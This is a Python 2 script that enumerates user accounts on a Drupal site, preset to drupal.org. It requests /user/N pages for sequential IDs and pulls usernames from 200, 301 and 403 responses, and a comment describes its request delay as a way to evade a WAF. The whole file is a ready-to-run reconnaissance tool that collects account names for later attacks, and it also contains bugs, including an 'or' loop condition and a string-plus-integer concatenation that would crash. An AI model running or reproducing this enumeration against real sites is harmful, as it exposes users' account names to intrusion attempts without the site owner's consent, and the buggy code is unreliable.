#!/usr/bin/python

import httplib
import time

def need_ssl(url):
	return url.partition(':')[0][-1] == 's'	
		
def get_domain(url):
	return url.partition('//')[2].partition('/')[0]
	
def get_ressource(url):
	return "/" + url.partition('//')[2].partition('/')[2]

def main():
        # URL (https?://domain.tld/)
        url = "https://www.drupal.org/"
        #delay between each request, in seconds (for prevent WAF)
        delay = 0.1
        #user ID to start with
        user_id = 1
        """
        You have two inputs for stop:
        - how many user ID you want to try
        - how many consecutive failed you can do
        """
        last_user_id = 1000
        failed_limit = 50

        if (last_user_id < user_id):
                print "Error"
                return 1
        if (user_id < 0) or (last_user_id < 0):
                print "Error"
                return 1
	
        consecutive_error = 0
        ssl = need_ssl(url)
        domain = get_domain(url)
        ressource = get_ressource(url)
        
        if ssl:
                conn = httplib.HTTPSConnection(domain)
        else:
                conn = httplib.HTTPConnection(domain)
		
        conn.request("GET", ressource)
        response = conn.getresponse()

        while(user_id < last_user_id or consecutive_error < failed_limit):
                if ssl:
                        conn = httplib.HTTPSConnection(domain)
                else:
                        conn = httplib.HTTPConnection(domain)

                conn.request("GET", ressource + "/user/" + str(user_id) + "/")
                response = conn.getresponse()

                #HTTP 200, user exist, usernam is in HTML code
                if response.status == 200:
                        print str(user_id) + ": " + response.read().partition("<title>")[2].partition(" |")[0]
                        consecutive_error = 0
                #HTTP 404, user does not exist
                elif response.status == 404:
                        print str(user_id) + " : //"
                        consecutive_error += 1
                #HTTP 301 page, username could be in HTTP location field
                elif response.status == 301:
                        location = response.getheader('location')
                        print location
                        if location.rpartition('/')[2] == str(user_id):
                                print str(user_id) + " : //"
                                consecutive_error += 1
                        else: 
                                print str(user_id) + " : " + location.rpartition('/')[2]
                                consecutive_error = 0
                #HTTP 403 page, user exist, username may be in HTML code		
                elif response.status == 403:
                        potential_username = response.read().partition("/users/")[2].partition('"')[0]
                        if potential_username == str(user_id):
                                print str(user_id) + " : //"
                                consecutive_error += 1
                        else:
                                print str(user_id) + " : " + potential_username
                                consecutive_error = 0
                else:
                        print "Error in: " + domain + ressource + "/user/" + str(user_id) + "/"
                        print "HTTP code: " + response.status
                        break

                user_id +=1
                time.sleep(delay)

        return 0

if __name__ == "__main__":
        main()
